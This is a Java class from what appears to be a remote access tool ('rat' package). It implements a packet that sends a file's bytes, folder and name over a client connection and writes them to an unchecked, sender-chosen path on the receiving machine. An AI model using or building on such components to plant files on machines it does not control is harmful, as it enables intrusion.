package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class UploadFilePacket implements IPacket {
	
	private byte[] data;
	private String folder, fileName;
	
	public UploadFilePacket(final String filePath, final String folder) {
		this.folder = folder;
		
		final File file = new File(filePath);
		
		data = FileUtils.readExternalData(filePath);
		fileName = file.getName();
	}
	
	public UploadFilePacket() {
		folder = fileName = "";
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeInt(data.length);
		client.write(data);
		client.writeUTF(folder);
		client.writeUTF(fileName);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		final int length = client.readInt();
		
		data = new byte[length];
		
		client.read(data);
		
		folder = client.readUTF();
		fileName = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final String path = folder + fileName;
		
		FileUtils.writeData(path, data);
	}
	
}
